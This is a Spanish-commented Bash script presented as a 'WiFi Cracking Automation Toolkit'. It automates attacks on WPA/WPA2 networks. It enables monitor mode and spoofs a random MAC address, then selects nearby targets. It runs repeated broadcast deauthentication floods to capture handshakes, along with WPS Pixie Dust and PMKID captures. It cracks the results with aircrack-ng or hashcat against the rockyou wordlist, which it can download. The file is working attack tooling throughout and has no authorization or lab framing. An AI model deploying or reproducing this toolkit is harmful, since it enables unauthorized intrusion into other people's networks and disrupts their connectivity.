#!/bin/bash

# Colores para el output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # Sin Color

# Directorio de trabajo predeterminado
WORK_DIR="$(pwd)/capturas"
mkdir -p "$WORK_DIR"

# Verificar permisos de root
if [ "$EUID" -ne 0 ]; then
  echo -e "${RED}[!] Por favor, ejecuta este script como root.${NC}"
  exit 1
fi

function check_dependencies() {
    clear
    echo -e "${YELLOW}[*] Verificando dependencias del sistema...${NC}"
    echo "========================================="
    
    # Lista de herramientas críticas y sus paquetes correspondientes
    # Formato: "herramienta:paquete"
    dependencies=(
        "airmon-ng:aircrack-ng"
        "airodump-ng:aircrack-ng"
        "aireplay-ng:aircrack-ng"
        "aircrack-ng:aircrack-ng"
        "hashcat:hashcat"
        "iwconfig:wireless-tools"
        "iw:iw"
        "wget:wget"
        "wash:reaver"
        "bully:bully"
        "hcxdumptool:hcxtools"
        "macchanger:macchanger"
        "cowpatty:cowpatty"
    )

    for item in "${dependencies[@]}"; do
        tool="${item%%:*}"
        package="${item##*:}"

        if ! command -v "$tool" &> /dev/null; then
            echo -e "${RED}[!] La herramienta '$tool' no está instalada.${NC}"
            read -p "¿Deseas instalar el paquete '$package'? [S/n]: " choice
            choice=${choice:-S} # Predeterminado a Sí
            
            if [[ "$choice" == "s" || "$choice" == "S" ]]; then
                echo -e "${YELLOW}[*] Actualizando e instalando $package...${NC}"
                apt-get update && apt-get install -y "$package"
                if ! command -v "$tool" &> /dev/null; then
                    echo -e "${RED}[!] Falló la instalación de $package. Saliendo...${NC}"
                    exit 1
                fi
                echo -e "${GREEN}[+] $package instalado correctamente.${NC}"
            else
                echo -e "${RED}[!] Se requiere '$tool' para continuar. Saliendo...${NC}"
                exit 1
            fi
        else
            echo -e "${GREEN}[OK] $tool encontrado.${NC}"
        fi
    done

    # Verificación opcional para hcxtools
    if ! command -v hcxpcapngtool &> /dev/null; then
        echo -e "${YELLOW}[INFO] 'hcxpcapngtool' no encontrado (útil para convertir .cap a hashcat).${NC}"
        read -p "¿Deseas instalar 'hcxtools' (opcional)? (s/n): " choice
        if [[ "$choice" == "s" || "$choice" == "S" ]]; then
             apt-get update && apt-get install -y hcxtools
        fi
    else
        echo -e "${GREEN}[OK] hcxpcapngtool encontrado.${NC}"
    fi

    echo -e "${GREEN}[*] Todas las dependencias están listas.${NC}"
    sleep 2
}

function banner() {
    clear
    echo -e "${GREEN}"
    echo "╔══════════════════════════════════════════════════════════╗"
    echo "║              WiFi Cracking Automation Toolkit            ║"
    echo "║                  Dev by: Lukas Otero                     ║"
    echo "╚══════════════════════════════════════════════════════════╝"
    echo -e "${NC}"
}

function show_loader() {
    local pid=$1
    local delay=0.1
    local spinstr='|/-\'
    echo -ne " "
    while [ "$(ps a | awk '{print $1}' | grep $pid)" ]; do
        local temp=${spinstr#?}
        printf " [%c]  " "$spinstr"
        local spinstr=$temp${spinstr%"$temp"}
        sleep $delay
        printf "\b\b\b\b\b\b"
    done
    printf "    \b\b\b\b"
}

function check_monitor_support() {
    local iface=$1
    if [ -z "$iface" ]; then return; fi

    echo -e "${YELLOW}[*] Verificando soporte de modo monitor para $iface...${NC}"

    # Obtener índice PHY
    local output=$(iw dev "$iface" info 2>/dev/null)
    local phy=$(echo "$output" | grep "wiphy" | awk '{print $2}')

    if [ -z "$phy" ]; then
        echo -e "${RED}[!] No se pudo obtener información del hardware para $iface.${NC}"
        # No bloqueamos, solo avisamos
        return
    fi

    # Verificar soporte en el hardware físico
    if iw phy "phy$phy" info 2>/dev/null | grep -q "monitor"; then
        echo -e "${GREEN}[OK] La interfaz soporta modo monitor.${NC}"
    else
        echo -e "${RED}[!] ALERTA: La interfaz '$iface' NO parece soportar modo monitor.${NC}"
        echo -e "${YELLOW}[!] Sin esto, el script fallará.${NC}"
        read -p "¿Deseas continuar de todos modos? (s/n): " choice
        if [[ "$choice" != "s" && "$choice" != "S" ]]; then exit 1; fi
    fi
}

function run_in_new_terminal() {
    local cmd="$1"
    local title="$2"
    
    echo -e "${YELLOW}[*] Abriendo ventana auxiliar para: $title...${NC}"
    
    # Intentar detectar emuladores de terminal comunes en Kali/Linux
    if command -v x-terminal-emulator > /dev/null 2>&1; then
        x-terminal-emulator -e "bash -c '$cmd; exec bash'" &
    elif command -v qterminal > /dev/null 2>&1; then
        qterminal -e "bash -c '$cmd; exec bash'" &
    elif command -v gnome-terminal > /dev/null 2>&1; then
        gnome-terminal -- bash -c "$cmd; exec bash" &
    elif command -v xfce4-terminal > /dev/null 2>&1; then
        xfce4-terminal -e "bash -c '$cmd; exec bash'" &
    elif command -v xterm > /dev/null 2>&1; then
        xterm -title "$title" -e "bash -c '$cmd; exec bash'" &
    else
        echo -e "${RED}[!] No se pudo abrir una nueva terminal automáticamente.${NC}"
        echo -e "${YELLOW}[*] Ejecutando en segundo plano (background)...${NC}"
        eval "$cmd" &
    fi
}

# Función auxiliar para obtener interfaces inalámbricas
function get_wireless_interfaces() {
    iw dev | grep Interface | awk '{print $2}'
}

# Función auxiliar para saber si está en modo monitor
function is_monitor_mode() {
    local iface=$1
    iw dev "$iface" info | grep -q "type monitor"
}

function ensure_mon_interface() {
    # Si ya tenemos una definida y sigue siendo válida, retornar
    if [ ! -z "$mon_interface" ] && is_monitor_mode "$mon_interface"; then
        return 0
    fi

    echo -e "${YELLOW}[*] Buscando interfaz en modo monitor...${NC}"
    
    # 1. Buscar si ya existe una activa
    for iface in $(get_wireless_interfaces); do
        if is_monitor_mode "$iface"; then
            mon_interface="$iface"
            echo -e "${GREEN}[+] Interfaz monitor detectada automáticamente: $mon_interface${NC}"
            return 0
        fi
    done
    
    # 2. Si no existe, intentar activar modo monitor en la primera interfaz disponible
    echo -e "${YELLOW}[*] No se detectó modo monitor. Intentando activar automáticamente...${NC}"
    for iface in $(get_wireless_interfaces); do
        # Ignorar si ya se chequeó antes (aunque el bucle anterior filtra los monitor)
        echo -e "${YELLOW}[*] Activando airmon-ng en $iface...${NC}"
        
        # Matar procesos que puedan interferir
        airmon-ng check kill > /dev/null 2>&1
        
        airmon-ng start "$iface" > /dev/null 2>&1 &
        show_loader $!
        
        # Buscar cuál es la nueva interfaz monitor
        for new_iface in $(get_wireless_interfaces); do
            if is_monitor_mode "$new_iface"; then
                mon_interface="$new_iface"
                echo -e "\n${GREEN}[+] Modo monitor iniciado correctamente en: $mon_interface${NC}"
                return 0
            fi
        done
    done
    
    # 3. Fallback manual si todo falla
    echo -e "${RED}[!] No se pudo activar automáticamente.${NC}"
    read -p "Ingresa el nombre de la interfaz en modo monitor (ej. wlan0mon): " mon_interface
}

function start_monitor_mode() {
    ensure_mon_interface
    
    # Opcional: Macchanger
    read -p "¿Deseas cambiar tu MAC a una aleatoria? (s/n): " ch_mac
    if [[ "$ch_mac" == "s" || "$ch_mac" == "S" ]]; then
        echo -e "${YELLOW}[*] Cambiando dirección MAC...${NC}"
        ifconfig "$mon_interface" down
        macchanger -r "$mon_interface"
        ifconfig "$mon_interface" up
    fi
}

function stop_monitor_mode() {
    banner
    read -p "Ingresa el nombre de la interfaz en modo monitor a detener (ej. wlan0mon): " mon_interface
    echo -e "${YELLOW}[*] Deteniendo modo monitor...${NC}"
    airmon-ng stop "$mon_interface"
    echo -e "${GREEN}[+] Modo monitor detenido.${NC}"
    echo -e "${YELLOW}[*] Reiniciando NetworkManager...${NC}"
    service NetworkManager restart
    read -p "Presiona Enter para continuar..."
}

function scan_networks() {
    banner
    ensure_mon_interface
    echo -e "${YELLOW}[*] Iniciando escaneo de redes (Modo Monitor).${NC}"
    echo -e "${YELLOW}[*] Presiona CTRL+C para detener y volver al menú.${NC}"
    read -p "Presiona Enter para comenzar..."
    airodump-ng "$mon_interface"
}

# Función modular para gestión de menús (uso interno)
function show_target_selection_menu() {
    local source_file="$1"
    
    echo -e "\n${YELLOW}╔════╤═══════════════════╤═════╤══════════════════════╗${NC}"
    printf "${YELLOW}║${NC} %-2s ${YELLOW}│${NC} %-17s ${YELLOW}│${NC} %-3s ${YELLOW}│${NC} %-20s ${YELLOW}║${NC}\n" "ID" "BSSID" "CH" "ESSID"
    echo -e "${YELLOW}╠════╪═══════════════════╪═════╪══════════════════════╣${NC}"
    
    # Declarar arrays locales
    local -a bssids
    local -a channels
    local -a essids
    local i=1
    
    # Leer archivo formateado: BSSID|CHANNEL|ESSID
    while IFS='|' read -r bssid channel essid; do
        if [[ -n "$bssid" ]]; then
             bssids[$i]="$bssid"
             channels[$i]="$channel"
             essids[$i]="$essid"
             
             printf "${YELLOW}║${NC} %-2s ${YELLOW}│${NC} %-17s ${YELLOW}│${NC} %-3s ${YELLOW}│${NC} %-20.20s ${YELLOW}║${NC}\n" "$i" "$bssid" "$channel" "$essid"
             ((i++))
        fi
    done < "$source_file"
    
    echo -e "${YELLOW}╚════╧═══════════════════╧═════╧══════════════════════╝${NC}"
    
    echo ""
    echo "0) Entrada Manual o Re-escanear"
    read -p "Selecciona el número de la red objetivo: " selection
    
    if [[ "$selection" == "0" ]]; then
        return 1
    elif [[ -n "${bssids[$selection]}" ]]; then
        TARGET_BSSID="${bssids[$selection]}"
        TARGET_CHANNEL="${channels[$selection]}"
        TARGET_ESSID="${essids[$selection]}"
        echo -e "${GREEN}[+] Seleccionado: $TARGET_ESSID ($TARGET_BSSID) [CH $TARGET_CHANNEL]${NC}"
        return 0
    else
        echo -e "${RED}[!] Selección inválida.${NC}"
        return 1
    fi
}

# Función maestra de Escaneo y Selección
# Modo: "airodump" (por defecto) o "wash"
function start_scan_and_selection() {
    local mode="${1:-airodump}"
    local duration=15
    local tmp_scan_prefix="/tmp/wifi_scan"
    local formatted_list="/tmp/wifi_targets.list"
    
    # Limpiar previos
    rm -f "${tmp_scan_prefix}"* "$formatted_list"

    echo -e "${YELLOW}[*] Escaneando objetivos ($mode) por $duration segundos...${NC}"
    
    if [[ "$mode" == "wash" ]]; then
        # Modo WPS (Wash)
        # Wash no siempre termina limpio con timeout, usamos kill
        wash -i "$mon_interface" -C > "${tmp_scan_prefix}.log" 2>&1 & 
        local pid=$!
    else
        # Modo Standard (Airodump)
        airodump-ng --output-format csv -w "$tmp_scan_prefix" "$mon_interface" > /dev/null 2>&1 &
        local pid=$!
    fi
    
    # Barra de progreso
    for ((i=1; i<=duration; i++)); do
        echo -n "▓"
        sleep 1
    done
    echo ""
    
    kill $pid 2>/dev/null
    wait $pid 2>/dev/null
    
    # Procesar salida según el modo
    if [[ "$mode" == "wash" ]]; then
        # Parsear salida de Wash
        # Formato usual: BSSID  Channel  RSSI  WPS  Lck  ESSID
        # La salida de Wash es irregular con espacios.
        # Omitir líneas de encabezado usualmente.
        grep -E "^[0-9A-F]{2}:" "${tmp_scan_prefix}.log" | awk '{
            # BSSID=$1, Canal=$2, ESSID=$6 en adelante (puede tener espacios)
            # Reconstruir ESSID
            essid=""; for(i=6;i<=NF;i++) essid=essid $i " ";
            print $1 "|" $2 "|" essid
        }' > "$formatted_list"
        
    else
        # Parsear CSV de Airodump
        local csv_file="${tmp_scan_prefix}-01.csv"
        if [ ! -f "$csv_file" ]; then return 1; fi
        
        awk -F, 'NR>1 && $1!="" && $1!~/Station MAC/ {
            gsub(/^[ \t]+|[ \t]+$/, "", $1);
            gsub(/^[ \t]+|[ \t]+$/, "", $4);
            gsub(/^[ \t]+|[ \t]+$/, "", $14);
            if(length($1)==17) print $1 "|" $4 "|" $14
        }' "$csv_file" > "$formatted_list"
    fi
    
    # Mostrar el menú modular
    if [ -s "$formatted_list" ]; then
        show_target_selection_menu "$formatted_list"
        return $?
    else
        echo -e "${RED}[!] No se encontraron redes.${NC}"
        return 1
    fi
}

function capture_handshake() {
    banner
    ensure_mon_interface
    
    # Escaneo modular
    start_scan_and_selection "airodump"
    if [ $? -eq 0 ]; then
        bssid="$TARGET_BSSID"
        channel="$TARGET_CHANNEL"
        default_name=$(echo "$TARGET_ESSID" | sed 's/ /_/g')
        read -p "Nombre para el archivo de captura (Enter para '$default_name'): " filename
        if [ -z "$filename" ]; then filename="$default_name"; fi
    else
        echo -e "${YELLOW}[!] Pasando a modo manual...${NC}"
        read -p "Ingresa el BSSID del objetivo: " bssid
        read -p "Ingresa el CANAL del objetivo: " channel
        read -p "Ingresa un nombre para el archivo de captura: " filename
    fi
    
    full_cap_path="$WORK_DIR/$filename"
    
    # Resto de la lógica idéntica...
    echo -e "${YELLOW}[*] Iniciando captura en canal $channel...${NC}"
    
    airodump_cmd="airodump-ng -c $channel --bssid $bssid -w $full_cap_path $mon_interface"
    run_in_new_terminal "$airodump_cmd" "Capturando Handshake - $bssid"
    
    echo -e "${YELLOW}[*] Esperando 5 segundos...${NC}"
    sleep 5
    
    while true; do
        echo -e "\n${RED}[ATTACK] Deauth masivo...${NC}"
        aireplay-ng -0 5 -a "$bssid" "$mon_interface"
        
        read -p "¿Capturado? (s/n): " captured
        if [[ "$captured" == "s" || "$captured" == "S" ]]; then
            pkill -f "airodump-ng.*$bssid"
            if aircrack-ng -b "$bssid" "$full_cap_path-01.cap" 2>&1 | grep -q "1 handshake"; then
                 echo -e "${GREEN}[OK] Handshake VÁLIDO.${NC}"
                 read -p "¿Crackear ahora? (s/n): " crack_now
                 if [[ "$crack_now" == "s" || "$crack_now" == "S" ]]; then
                     crack_password_auto "$full_cap_path-01.cap" "$bssid"
                 fi
            else
                 echo -e "${RED}[!] Handshake inválido.${NC}"
            fi
            break
        else
            echo -e "${YELLOW}[*] Reintentando ataque en 2 segundos...${NC}"
            sleep 2
        fi
    done
}

function deauth_attack() {
    banner
    ensure_mon_interface
    
    read -p "Ingresa el BSSID del Router objetivo: " bssid
    read -p "Ingresa el BSSID del Cliente (o déjalo vacío para broadcast): " client
    read -p "Cantidad de paquetes de desautenticación (ej. 10): " packets
    
    if [ -z "$client" ]; then
        echo -e "${YELLOW}[*] Iniciando ataque de desautenticación BROADCAST...${NC}"
        aireplay-ng -0 "$packets" -a "$bssid" "$mon_interface"
    else
        echo -e "${YELLOW}[*] Iniciando ataque de desautenticación dirigido al cliente $client...${NC}"
        aireplay-ng -0 "$packets" -a "$bssid" -c "$client" "$mon_interface"
    fi
    read -p "Presiona Enter para continuar..."
}

function wps_attack() {
    banner
    ensure_mon_interface

    echo -e "${YELLOW}[*] Ataque WPS (Pixie Dust)${NC}"

    # Escaneo Modular (modo wash)
    start_scan_and_selection "wash"
    if [ $? -eq 0 ]; then
        bssid="$TARGET_BSSID"
        channel="$TARGET_CHANNEL"
    else
        echo -e "${YELLOW}[!] Pasando a modo manual...${NC}"
        read -p "Ingresa el BSSID del objetivo: " bssid
        read -p "Ingresa el Canal (CH): " channel
    fi
    
    echo -e "${YELLOW}[*] Iniciando ataque con Bully...${NC}"
    bully -b "$bssid" -c "$channel" -d -v 3 "$mon_interface"
    
    read -p "Presiona Enter para continuar..."
}

function pmkid_attack() {
    banner
    ensure_mon_interface
    
    echo -e "${YELLOW}[*] Ataque PMKID (Client-less)${NC}"
    
    # Escaneo Modular (modo airodump, igual que handshake)
    start_scan_and_selection "airodump"
    if [ $? -eq 0 ]; then
        target_bssid="$TARGET_BSSID"
    else
        read -p "Ingresa el BSSID del objetivo (o vacío para TODO): " target_bssid
    fi

    read -p "Tiempo de captura en segundos (ej. 60): " capture_time
    dump_file="$WORK_DIR/pmkid_capture_$(date +%s).pcapng"
    
    echo -e "${YELLOW}[*] Capturando PMKID...${NC}"
    
    F_OPT=""
    if [ ! -z "$target_bssid" ]; then
        echo "$target_bssid" | sed 's/://g' > filter.txt
        F_OPT="--filterlist_ap=filter.txt --enable_status=1"
    fi
    
    timeout "$capture_time" hcxdumptool -i "$mon_interface" -w "$dump_file" $F_OPT
    
    echo -e "\n${GREEN}[+] Captura finalizada.${NC}"
    
    if [ -f "$dump_file" ]; then
        # Intentar extraer directamente
        hcxpcapngtool -o "${dump_file}.hc22000" "$dump_file"
        
        if [ -f "${dump_file}.hc22000" ]; then
            echo -e "${GREEN}[!!!] Hashes PMKID extraídos.${NC}"
            read -p "¿Crackear ahora? (s/n): " crack_now
            if [[ "$crack_now" == "s" || "$crack_now" == "S" ]]; then
                 crack_password_auto "${dump_file}.hc22000" "PMKID"
            fi
        else
            echo -e "${RED}[!] No se encontraron PMKIDs.${NC}"
        fi
    else
        echo -e "${RED}[!] Error en captura.${NC}"
    fi
    
    read -p "Presiona Enter para continuar..."
}

function crack_password_auto() {
    local cap_file_input="$1"
    local bssid_input="$2"
    
    echo -e "${YELLOW}[*] Configuración rápida de cracking...${NC}"
    
    # Selección rápida de diccionario (Prioriza RockYou local)
    wordlist=""
    if [ -f "$WORK_DIR/rockyou.txt" ]; then
        wordlist="$WORK_DIR/rockyou.txt"
    elif [ -f "/usr/share/wordlists/rockyou.txt" ]; then
        wordlist="/usr/share/wordlists/rockyou.txt"
    else
        echo -e "${RED}[!] No se encontró rockyou.txt automáticmente. Usando selección manual...${NC}"
        # Fallback a función manual si falla
        crack_password
        return
    fi
    
    echo -e "${GREEN}[*] Usando diccionario: $wordlist${NC}"
    
    # Decidir herramienta basado en extensión o tipo
    if [[ "$cap_file_input" == *.hc22000 ]]; then
        echo -e "${YELLOW}[*] Detectado Hashcat Mode (PMKID/Converted). Usando GPU...${NC}"
        hashcat -a 0 -m 22000 -w 3 "$cap_file_input" "$wordlist"
    else
        echo -e "${YELLOW}[*] Detectado Aircrack-ng Mode (Handshake). Usando CPU...${NC}"
        aircrack-ng -a2 -b "$bssid_input" -w "$wordlist" "$cap_file_input"
    fi
    read -p "Presiona Enter para continuar..."
}

function verify_handshake() {
    banner
    echo -e "${YELLOW}[*] Verificar integridad del Handshake${NC}"
    
    while true; do
        read -p "Ingresa la ruta del archivo .cap: " cap_file
        if [ -f "$cap_file" ]; then break; else echo -e "${RED}[!] Archivo no encontrado.${NC}"; fi
    done
    
    read -p "Ingresa el BSSID (opcional, Enter para omitir): " bssid
    
    echo -e "${YELLOW}[*] Analizando archivo con cowpatty...${NC}"
    
    # Cowpatty -c solo verificación
    if [ -z "$bssid" ]; then
        cowpatty -c -r "$cap_file"
    else
        # Si se da BSSID, filtramos. Cowpatty necesita SSID (-s), pero usaremos aircrack -J para validar.
        # Mejor usamos aircrack-ng para un check rápido si tenemos BSSID
        echo -e "${YELLOW}[*] Usando aircrack-ng para validar handshake de $bssid...${NC}"
        output=$(aircrack-ng -b "$bssid" "$cap_file" 2>&1)
        if echo "$output" | grep -q "1 handshake"; then
             echo -e "${GREEN}[OK] Handshake VÁLIDO encontrado para $bssid.${NC}"
        else
             echo -e "${RED}[!] NO se detectó un handshake válido o completo.${NC}"
             echo "Salida de aircrack-ng:"
             echo "$output" | grep -E "handshake|No valid packets"
        fi
    fi
     
    read -p "Presiona Enter para continuar..."
}

function crack_password() {
    banner
    echo -e "${YELLOW}[*] Configuración del ataque de diccionario${NC}"
    
    # 1. Selección de Diccionario
    while true; do
        echo -e "\n${YELLOW}--- Selección de Diccionario ---${NC}"
        echo "1) Ingresar ruta manual"
        echo "2) Usar RockYou (Buscar en /usr/share/wordlists/)"
        echo "3) Descargar RockYou (desde GitHub)"
        read -p "Opción: " wl_choice

        case $wl_choice in
            1)
                read -p "Ruta del archivo: " wordlist
                if [ -f "$wordlist" ]; then break; else echo -e "${RED}[!] Archivo no encontrado.${NC}"; fi
                ;;
            2)
                # Intentar localizar rockyou en rutas comunes
                locations=(
                    "/usr/share/wordlists/rockyou.txt"
                    "/usr/share/wordlists/rockyou.txt.gz"
                )
                found=0
                for loc in "${locations[@]}"; do
                    if [ -f "$loc" ]; then
                        if [[ "$loc" == *.gz ]]; then
                            echo -e "${YELLOW}[*] Descomprimiendo $loc...${NC}"
                            gunzip -c "$loc" > "$WORK_DIR/rockyou.txt"
                            wordlist="$WORK_DIR/rockyou.txt"
                        else
                            wordlist="$loc"
                        fi
                        echo -e "${GREEN}[+] Diccionario seleccionado: $wordlist${NC}"
                        found=1
                        break
                    fi
                done
                
                if [ $found -eq 1 ]; then break; else echo -e "${RED}[!] RockYou no encontrado en rutas estándar.${NC}"; fi
                ;;
            3)
                wordlist="$WORK_DIR/rockyou.txt"
                echo -e "${YELLOW}[*] Descargando RockYou.txt...${NC}"
                if wget -q --show-progress -O "$wordlist" https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt; then
                    echo -e "${GREEN}[+] Descarga completada: $wordlist${NC}"
                    break
                else
                    echo -e "${RED}[!] Error al descargar. Verifica tu conexión.${NC}"
                fi
                ;;
            *) echo "Opción inválida." ;;
        esac
    done

    # 2. Pedir archivo de captura (.cap)
    while true; do
        read -p "Ingresa la ruta del archivo de captura (.cap): " cap_file
        if [ -f "$cap_file" ]; then
            break
        else
            echo -e "${RED}[!] El archivo no existe. Intenta de nuevo.${NC}"
        fi
    done

    # 3. Menú de recursos
    echo ""
    echo "Selecciona el recurso para crackear:"
    echo "1) CPU (Aircrack-ng - Estándar)"
    echo "2) GPU (Hashcat - Alto Rendimiento)"
    read -p "Opción: " resource_opt

    case $resource_opt in
        1)
            echo -e "${YELLOW}[*] Necesitamos el BSSID para filtrar el ataque.${NC}"
            read -p "Ingresa el BSSID del objetivo: " bssid
            
            echo -e "${YELLOW}[*] Iniciando aircrack-ng con CPU...${NC}"
            echo -e "${RED}[!] IMPORTANTE: Solo funcionará si la contraseña está en tu diccionario.${NC}"
            aircrack-ng -a2 -b "$bssid" -w "$wordlist" "$cap_file"
            ;;
        2)
            echo -e "${YELLOW}[*] Preparando ataque con GPU (Hashcat)...${NC}"
            
            # Lógica de conversión
            hash_file=""
            if command -v hcxpcapngtool &> /dev/null; then
                 echo -e "${GREEN}[*] Herramienta 'hcxpcapngtool' detectada.${NC}"
                 output_hc="${cap_file%.*}.hc22000"
                 
                 echo -e "${YELLOW}[*] Convirtiendo .cap a formato hashcat (.hc22000)...${NC}"
                 hcxpcapngtool -o "$output_hc" "$cap_file"
                 
                 if [ -f "$output_hc" ]; then
                     echo -e "${GREEN}[+] Conversión exitosa: $output_hc${NC}"
                     hash_file="$output_hc"
                 else
                     echo -e "${RED}[!] Falló la conversión automática.${NC}"
                 fi
            else
                 echo -e "${YELLOW}[!] No se encontró 'hcxpcapngtool' para conversión automática.${NC}"
                 echo -e "${YELLOW}[!] Necesitas convertir el archivo .cap a .hc22000 manualmente (ej. https://hashcat.net/cap2hashcat/).${NC}"
            fi

            if [ -z "$hash_file" ]; then
                while true; do
                    read -p "Ingresa la ruta del archivo convertido (.hc22000): " hash_file
                    if [ -f "$hash_file" ]; then
                        break
                    else
                         echo -e "${RED}[!] Archivo no encontrado.${NC}"
                    fi
                done
            fi
            
            echo -e "${YELLOW}[*] Iniciando hashcat (Modo 22000)...${NC}"
            # -w 3 para alta carga de trabajo, ideal para GPU dedicada
            hashcat -a 0 -m 22000 -w 3 "$hash_file" "$wordlist"
            ;;
        *)
            echo "Opción inválida."
            ;;
    esac
    read -p "Presiona Enter para continuar..."
}

# Ejecutar verificación de dependencias al inicio
check_dependencies

while true; do
    banner
    echo -e "${YELLOW}╔════════════════ ATTACK MENU ════════════════╗${NC}"
    echo -e "${YELLOW}║${NC} 1) Ataque WPA/WPA2 Clásico (Handshake)     ${YELLOW}║${NC}"
    echo -e "${YELLOW}║${NC} 2) Ataque WPS (Pixie Dust)                 ${YELLOW}║${NC}"
    echo -e "${YELLOW}║${NC} 3) Ataque PMKID (Client-less)              ${YELLOW}║${NC}"
    echo -e "${YELLOW}╠═════════════════════════════════════════════╣${NC}"
    echo -e "${YELLOW}║${NC} 4) Herramientas Extra (Crackear, Tests)    ${YELLOW}║${NC}"
    echo -e "${YELLOW}║${NC} 5) Detener Modo Monitor y Salir            ${YELLOW}║${NC}"
    echo -e "${YELLOW}║${NC} 6) Salir                                   ${YELLOW}║${NC}"
    echo -e "${YELLOW}╚═════════════════════════════════════════════╝${NC}"
    echo ""
    read -p "Selecciona una opción: " option
    
    case $option in
        1) capture_handshake ;;
        2) wps_attack ;;
        3) pmkid_attack ;;
        4) extra_tools_menu ;;
        5) stop_monitor_mode; exit 0 ;;
        6) exit 0 ;;
        *) echo -e "${RED}Opción inválida${NC}"; sleep 1 ;;
    esac
done

function extra_tools_menu() {
    clear
    banner
    echo -e "${YELLOW}╔════════════════ EXTRA TOOLS ════════════════╗${NC}"
    echo -e "${YELLOW}║${NC} 1) Escanear Redes (airodump-ng)            ${YELLOW}║${NC}"
    echo -e "${YELLOW}║${NC} 2) Ataque Desautenticación Manual          ${YELLOW}║${NC}"
    echo -e "${YELLOW}║${NC} 3) Verificar Handshake (.cap)              ${YELLOW}║${NC}"
    echo -e "${YELLOW}║${NC} 4) Crackear Contraseña (Manual)            ${YELLOW}║${NC}"
    echo -e "${YELLOW}╠═════════════════════════════════════════════╣${NC}"
    echo -e "${YELLOW}║${NC} 5) Volver                                  ${YELLOW}║${NC}"
    echo -e "${YELLOW}╚═════════════════════════════════════════════╝${NC}"
    echo ""
    read -p "Opción: " ext_opt
    case $ext_opt in
        1) scan_networks ;;
        2) deauth_attack ;;
        3) verify_handshake ;;
        4) crack_password ;;
        5) return ;;
    esac
}
